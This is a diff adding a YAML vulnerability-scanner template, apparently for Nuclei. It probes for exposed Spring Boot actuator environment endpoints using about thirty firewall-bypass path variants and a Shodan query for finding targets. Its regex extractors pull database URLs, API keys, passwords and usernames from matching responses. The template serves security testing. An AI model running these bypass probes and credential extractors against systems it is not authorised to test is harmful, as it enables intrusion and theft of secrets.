@@ -1,0 +1,114 @@
+id: springboot-env-waf-bypass
+
+info:
+  name: Spring Boot Environment Exposure - WAF Bypass
+  author: shafranpackeer
+  severity: high
+  description: |
+    Detects exposed Spring Boot environment endpoints using WAF bypass techniques.
+    These endpoints can leak sensitive configuration including database credentials,
+    API keys, and internal system properties.
+  reference:
+    - https://docs.spring.io/spring-boot/docs/current/actuator-api/htmlsingle/#env
+  metadata:
+    verified: true
+    max-request: 35
+    shodan-query: http.favicon.hash:116323821
+  tags: springboot,actuator,env,exposure,waf-bypass
+
+http:
+  - method: GET
+    path:
+      # Standard paths
+      - "{{BaseURL}}/env"
+      - "{{BaseURL}}/actuator/env"
+
+      # URL encoded variations
+      - "{{BaseURL}}/%65nv"
+      - "{{BaseURL}}/en%76"
+      - "{{BaseURL}}/%61ctuator/env"
+      - "{{BaseURL}}/actuator/%65nv"
+      - "{{BaseURL}}/actuator%2Fenv"
+
+      # Semicolon injection
+      - "{{BaseURL}}/env;.js"
+      - "{{BaseURL}}/env;jsessionid=test"
+      - "{{BaseURL}}/actuator;/env"
+      - "{{BaseURL}}/env;.json"
+
+      # Path traversal
+      - "{{BaseURL}}/./env"
+      - "{{BaseURL}}//env"
+      - "{{BaseURL}}/env/../env"
+      - "{{BaseURL}}/actuator/../actuator/env"
+
+      # Alternate base paths
+      - "{{BaseURL}}/manage/env"
+      - "{{BaseURL}}/management/env"
+      - "{{BaseURL}}/admin/env"
+      - "{{BaseURL}}/mgmt/env"
+
+      # Case variations
+      - "{{BaseURL}}/ENV"
+      - "{{BaseURL}}/Env"
+      - "{{BaseURL}}/ACTUATOR/env"
+      - "{{BaseURL}}/Actuator/Env"
+
+      # Extension bypass
+      - "{{BaseURL}}/env.json"
+      - "{{BaseURL}}/env.xml"
+      - "{{BaseURL}}/env.do"
+      - "{{BaseURL}}/env.action"
+
+      # Query string bypass
+      - "{{BaseURL}}/env?format=json"
+      - "{{BaseURL}}/env?type=all"
+      - "{{BaseURL}}/env#"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"activeProfiles"'
+          - '"propertySources"'
+          - 'systemProperties'
+          - 'systemEnvironment'
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+          - "application/vnd.spring-boot.actuator"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: database-url
+        regex:
+          - 'jdbc:([^"]+)'
+          - 'mongodb://([^"]+)'
+          - 'redis://([^"]+)'
+
+      - type: regex
+        name: api-keys
+        regex:
+          - '(api[_-]?key|apikey)"?\s*[:=]\s*"([^"]+)"'
+          - '(secret[_-]?key|secretkey)"?\s*[:=]\s*"([^"]+)"'
+
+      - type: regex
+        name: credentials
+        regex:
+          - '(password|passwd|pwd)"?\s*[:=]\s*"([^"]+)"'
+          - '(username|user)"?\s*[:=]\s*"([^"]+)"'
+
+      - type: json
+        name: active-profiles
+        json:
+          - '.activeProfiles[]'
